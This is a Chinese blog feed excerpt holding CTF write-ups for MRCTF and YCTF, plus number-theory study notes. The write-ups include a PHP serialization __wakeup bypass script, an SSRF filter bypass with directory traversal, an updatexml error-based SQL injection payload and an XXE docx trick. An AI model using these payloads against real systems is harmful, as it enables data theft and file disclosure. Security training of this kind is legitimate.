class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在 PHP5 最新的 CVS 中，</span><br><span class="line">新的序列化方式叫做 escaped binary string 方式，这是相对与普通那种 non-escaped binary string 方式来说的：</span><br><span class="line">string 型数据（字符串）新的序列化格式为：</span><br><span class="line">S:&quot;&lt;length&gt;&quot;:&quot;&lt;value&gt;&quot;;</span><br><span class="line">其中 &lt;length&gt; 是源字符串的长度，而非 &lt;value&gt; 的长度。&lt;length&gt; 是非负整数，数字前可以带有正号（+）。&lt;value&gt; 为经过转义之后的字符串。</span><br><span class="line">它的转义编码很简单，对于 ASCII 码小于 128 的字符（但不包括 \），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \ 作为开头，后面两个字节分别是这个字符的 16 进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1 位作为第二个字节。依次编码下来，得到的就是 &lt;value&gt; 的内容了。</span><br></pre></td></tr></table></figure><p>普通的序列化小s对应的就是普通的字符串，如s:3:”%00a%00”;<br> 而序列化的大S则对应的是\加上16进制，如S:2:”\00a\00”。</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402225703750.png" alt></p><p>将不可见字符%00转化为十六进制，大S成功执行wakeup</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402230042727.png" alt></p><p>小写s则失败</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402225923011.png" alt></p><p>转换脚本，参考颖奇师傅的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function decorate($str)</span><br><span class="line">&#123;</span><br><span class="line">    $arr &#x3D; explode(&#39;:&#39;, $str);</span><br><span class="line">    $newstr &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;00&#x2F;&#39;, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i-2] &#x3D; preg_replace(&#39;&#x2F;s&#x2F;&#39;, &quot;S&quot;, $arr[$i-2]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i &#x3D; 0;</span><br><span class="line">    for (; $i &lt; count($arr) - 1; $i++) &#123;</span><br><span class="line">        $newstr .&#x3D; $arr[$i];</span><br><span class="line">        $newstr .&#x3D; &quot;:&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .&#x3D; $arr[$i];</span><br><span class="line">    return $newstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/105189436" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/105189436</a></p><p><a href="https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge</a></p><p><a href="https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/" target="_blank" rel="noopener">https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/</a></p></blockquote><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484708&amp;idx=1&amp;sn=8ebc3f4f1850da54ab7cb1b1879921e0&amp;chksm=9760f1f2a01778e44b586e45172230db1b2b0da09a3b6c357705e930a43260c244e2aa1ecdb6&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1585840887466&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484708&amp;idx=1&amp;sn=8ebc3f4f1850da54ab7cb1b1879921e0&amp;chksm=9760f1f2a01778e44b586e45172230db1b2b0da09a3b6c357705e930a43260c244e2aa1ecdb6&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1585840887466&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h3&gt;&lt;h4 id=&quot;0x-01-Ez-bypass&quot;&gt;&lt;a href=&quot;#0x-01-Ez-bypass&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="MRCTF" scheme="http://yoursite.com/tags/MRCTF/"/>
    
  </entry>
  
  <entry>
    <title>信息安全数学基础学习笔记</title>
    <link href="http://yoursite.com/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-27T15:54:26.000Z</published>
    <updated>2020-04-06T12:44:14.918Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第一章-整数的可除性"><a href="#第一章-整数的可除性" class="headerlink" title="第一章 整数的可除性"></a>第一章 整数的可除性</h3><h4 id="0x-01-广义欧几里得除法-求最大公因数"><a href="#0x-01-广义欧几里得除法-求最大公因数" class="headerlink" title="0x  01 广义欧几里得除法 求最大公因数"></a>0x  01 广义欧几里得除法 求最大公因数</h4><ul><li>基础定理</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200331224130106.png" alt></p><ul><li>实现过程</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20180410203051218.png" alt></p><ul><li>python代码实现</li></ul><h4 id="0x-02-贝祖（Bezout）等式"><a href="#0x-02-贝祖（Bezout）等式" class="headerlink" title="0x 02 贝祖（Bezout）等式"></a>0x 02 贝祖（Bezout）等式</h4><ul><li>基本定理</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401114721981.png" alt></p><ul><li>求解等式</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401121714567.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401121756609.png" alt></p><h4 id="0x-03-最大公因数进一步性质"><a href="#0x-03-最大公因数进一步性质" class="headerlink" title="0x 03 最大公因数进一步性质"></a>0x 03 最大公因数进一步性质</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401221905664.png" alt></p><h4 id="0x-04-整数的进一步性质"><a href="#0x-04-整数的进一步性质" class="headerlink" title="0x 04 整数的进一步性质"></a>0x 04 整数的进一步性质</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401222233184.png" alt></p><h4 id="0x-05-算术基本定理与素数定理"><a href="#0x-05-算术基本定理与素数定理" class="headerlink" title="0x 05 算术基本定理与素数定理"></a>0x 05 算术基本定理与素数定理</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401193511202.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401222410868.png" alt></p><h3 id="第二章-同余"><a href="#第二章-同余" class="headerlink" title="第二章 同余"></a>第二章 同余</h3><h4 id="0x-01-同余的基本概念和性质"><a href="#0x-01-同余的基本概念和性质" class="headerlink" title="0x 01 同余的基本概念和性质"></a>0x 01 同余的基本概念和性质</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403222304291.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403224812594.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403224939302.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225013389.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225117248.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225331985.png" alt></p><h4 id="0x-02-剩余类与完全剩余"><a href="#0x-02-剩余类与完全剩余" class="headerlink" title="0x 02 剩余类与完全剩余"></a>0x 02 剩余类与完全剩余</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404225247817.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404225914840.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404230300776.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404232810037.png" alt></p><h4 id="0x-03-简化剩余系与欧拉函数"><a href="#0x-03-简化剩余系与欧拉函数" class="headerlink" title="0x 03 简化剩余系与欧拉函数"></a>0x 03 简化剩余系与欧拉函数</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404233701768.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406100107582.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204153855.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204246058.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204313339.png" alt></p><h4 id="0x-04-欧拉定理"><a href="#0x-04-欧拉定理" class="headerlink" title="0x 04 欧拉定理"></a>0x 04 欧拉定理</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;第一章-整数的可除性&quot;&gt;&lt;a href=&quot;#第一章-整数的可除性&quot; class=&quot;headerlink&quot; title=&quot;第一章 整数的可除性&quot;&gt;&lt;/a&gt;第一章 整数的可除性&lt;/h3&gt;&lt;h4 id=&quot;0x-01-广义欧几里得除法-求最大公因数&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="knowledge" scheme="http://yoursite.com/categories/knowledge/"/>
    
    
      <category term="信安数基" scheme="http://yoursite.com/tags/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA/"/>
    
  </entry>
  
  <entry>
    <title>YCTF-共克时艰.停课不停赛题解</title>
    <link href="http://yoursite.com/2020/03/27/YCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/03/27/YCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3/</id>
    <published>2020-03-27T13:15:56.000Z</published>
    <updated>2020-03-27T14:02:12.187Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-rce-nopar"><a href="#0x-01-rce-nopar" class="headerlink" title="0x 01 rce nopar"></a>0x 01 rce nopar</h4><ul><li><p>考点</p><p>无参数rce</p></li><li><p>解题步骤</p></li></ul><p>根据代码审计得知是无参数rce，用session读文件</p><p>​        <img src="https://uploader.shimo.im/f/5MzRLiUyqO0eMMsW.png!thumbnail" alt="img">      </p><h4 id="0x-02-SSRF"><a href="#0x-02-SSRF" class="headerlink" title="0x 02 SSRF"></a>0x 02 SSRF</h4><ul><li><p>考点</p><p>SSRF</p></li><li><p>解题过程</p></li></ul><ol><li>首先用base64二次编码读源码      <img src="https://uploader.shimo.im/f/zDj6k19gpNgYKm92.png!thumbnail" alt="img">      </li></ol><p>index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">if(! isset($_GET[&#39;file&#39;]))</span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?file&#x3D;WTNSbWFXMWhaMlV1YW5Cbg&#x3D;&#x3D;&#39;);</span><br><span class="line">$file &#x3D; base64_decode(base64_decode($_GET[&#39;file&#39;]));</span><br><span class="line">echo &#39;&lt;title&gt;&#39;.$_GET[&#39;file&#39;].&#39;&lt;&#x2F;title&gt;&#39;;</span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;,&quot;&quot;, $file);</span><br><span class="line">echo &#39;input_filename:   &#39;. $file.&#39;&lt;&#x2F;br&gt;&#39;;</span><br><span class="line">$file &#x3D; str_replace(&quot;ctf&quot;,&quot;flag&quot;, $file);</span><br><span class="line">echo &#39;real_filename:   &#39;.$file.&#39;&lt;&#x2F;br&gt;&#39;;</span><br><span class="line">$txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line"> </span><br><span class="line">echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">&#x2F;*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> * Hint: hal0flagi5here.php</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><p>读取hal0flagi5here.php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$argv[1]&#x3D;$_GET[&#39;url&#39;];</span><br><span class="line">if(filter_var($argv[1],FILTER_VALIDATE_URL))</span><br><span class="line">&#123;</span><br><span class="line">$r &#x3D; parse_url($argv[1]);</span><br><span class="line">print_r($r);</span><br><span class="line">if(preg_match(&#39;&#x2F;happyctf\.com$&#x2F;&#39;,$r[&#39;host&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">$url&#x3D;file_get_contents($argv[1]);</span><br><span class="line">echo($url);</span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">echo(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;403 Forbidden&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用0://绕过filter_var($argv[1],FILTER_VALIDATE_URL)然后目录穿越即可        <img src="https://uploader.shimo.im/f/G7Qe2Bk3DI4WI1ui.png!thumbnail" alt="img">               <img src="https://uploader.shimo.im/f/6CT03lROCWoVlN3F.png!thumbnail" alt="img">      </p><h4 id="0x-03-WEB3-SQLI"><a href="#0x-03-WEB3-SQLI" class="headerlink" title="0x 03 WEB3-SQLI"></a>0x 03 WEB3-SQLI</h4><ul><li><p>考点</p><p>二次注入+报错注入</p></li><li><p>解题过程</p></li></ul><p>注册这边邮箱存在waf,不能存在@符号，直接置空就行</p><p>paylod：<code>test&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</code></p><p>得到数据表</p><p><img src="https://uploader.shimo.im/f/JIfGTqEETasaqGhS.png!thumbnail" alt="img"></p><p>查询flag表的flag字段（TABLENAME:flag   columnname:flag）      <img src="https://uploader.shimo.im/f/DA0O3EtilM4Z101y.png!thumbnail" alt="img">      </p><h3 id="0x-04-XXE"><a href="#0x-04-XXE" class="headerlink" title="0x 04 XXE"></a>0x 04 XXE</h3><ul><li><p>考点</p><p>xxe</p></li><li><p>解题过程</p></li></ul><p>1.下载泄露的文件得到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&quot;submit&quot;])) &#123;</span><br><span class="line">    $target_file &#x3D; getcwd().&quot;&#x2F;upload&#x2F;&quot;.md5($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">    if (move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $target_file)) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $result &#x3D; @file_get_contents(&quot;zip:&#x2F;&#x2F;&quot;.$target_file.&quot;#docProps&#x2F;core.xml&quot;);</span><br><span class="line">            $xml &#x3D; new SimpleXMLElement($result, LIBXML_NOENT);</span><br><span class="line">            $xml-&gt;registerXPathNamespace(&quot;dc&quot;, &quot;http:&#x2F;&#x2F;purl.org&#x2F;dc&#x2F;elements&#x2F;1.1&#x2F;&quot;);</span><br><span class="line">            foreach($xml-&gt;xpath(&#39;&#x2F;&#x2F;dc:title&#39;) as $title)&#123;</span><br><span class="line">                echo &quot;Title &#39;&quot;.$title . &quot;&#39; has been added.&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception $e)&#123;</span><br><span class="line">            echo $e;</span><br><span class="line">            echo &quot;上传文件不是一个docx文档.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;上传失败.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解法参考：<a href="https://www.jianshu.com/p/40d6d0e7117f" target="_blank" rel="noopener">https://www.jianshu.com/p/40d6d0e7117f</a></p><p>将sample,docx解压，修改docProps/core.xml然后再压缩改后缀上传得到flag</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x-01-XOR"><a href="#0x-01-XOR" class="headerlink" title="0x 01 XOR"></a>0x 01 XOR</h4><p>赛后群里的师傅给了博客参考：</p><p><a href="https://shawroot.hatenablog.com/entry/2019/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%3Acr2-many-time-secrets" target="_blank" rel="noopener">https://shawroot.hatenablog.com/entry/2019/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%3Acr2-many-time-secrets</a></p><h4 id="0x-02-Misc2"><a href="#0x-02-Misc2" class="headerlink" title="0x 02 Misc2"></a>0x 02 <strong>Misc2</strong></h4><p>题目给了一个disk3，用file查一下，是Linux etx3，我们创个文件夹挂载        <img src="https://uploader.shimo.im/f/6uoNXvttnOI2XrtW.png!thumbnail" alt="img">      里面有一个readme和一个压缩包，里面有加密的flag.pngreadme说密码被删除了        <img src="https://uploader.shimo.im/f/aOrCmKlkEgA9xLV8.png!thumbnail" alt="img">      </p><p>用DiskGenius工具恢复一下文件得到压缩包密码don0tgu355p@sswd，最后这个png文件改一下高度，得到flag</p><p><img src="/2020/03/27/YCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3/E:%5CHexo-Blog%5Csource_posts%5CYCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3%5Cimage-20200327215149221.png" alt="image-20200327215149221"></p><h4 id="0x-03-Keyboard"><a href="#0x-03-Keyboard" class="headerlink" title="0x 03 Keyboard"></a>0x 03 Keyboard</h4><p>参考：<a href="https://www.cnblogs.com/cnnnnnn/p/11939107.html原题" target="_blank" rel="noopener">https://www.cnblogs.com/cnnnnnn/p/11939107.html原题</a></p><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="0x-01-签到"><a href="#0x-01-签到" class="headerlink" title="0x 01 签到"></a>0x 01 签到</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.en -inkey rsa_private_key.pem -out flag.txt</span><br><span class="line">flag&#123;We1c0meCtf3r_elab&#125;</span><br></pre></td></tr></table></figure><h4 id="0x-02-CRC32"><a href="#0x-02-CRC32" class="headerlink" title="0x 02 CRC32"></a>0x 02 CRC32</h4><p>CRC32爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">crcs &#x3D; set([0x308E1D5B,0x5194C2D0,0x5C48F6CA])</span><br><span class="line"></span><br><span class="line">def crackfour():</span><br><span class="line">    r &#x3D; xrange(32, 127)</span><br><span class="line">    for a in r:</span><br><span class="line">        for b in r:</span><br><span class="line">         for c in r:</span><br><span class="line">            for d in r:</span><br><span class="line">               txt &#x3D; chr(a)+chr(b)+chr(c)+chr(d)</span><br><span class="line">               crc &#x3D; binascii.crc32(txt)</span><br><span class="line">               if (crc &amp; 0xFFFFFFFF) in crcs:</span><br><span class="line">                  print txt</span><br><span class="line">crackfour()</span><br></pre></td></tr></table></figure><p>得到压缩包密码是64p2@sworD20，解压得到flag</p><h4 id="0x-03-RSABackDoor"><a href="#0x-03-RSABackDoor" class="headerlink" title="0x 03 RSABackDoor"></a>0x 03 RSABackDoor</h4><p>原题，参考<a href="https://xz.aliyun.com/t/6703" target="_blank" rel="noopener">https://xz.aliyun.com/t/6703</a></p><p>得到flag{4e8954396d69c8daaf849655cee3dc9bd6486a0e}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h3&gt;&lt;h4 id=&quot;0x-01-rce-nopar&quot;&gt;&lt;a href=&quot;#0x-01-rce-nopar&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="YCTF" scheme="http://yoursite.com/tags/YCTF/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化笔记</title>
    <link href="http://yoursite.com/2020/03/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/03/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-26T02:03:23.000Z</published>
    <updated>2020-03-26T07:48:41.709Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" 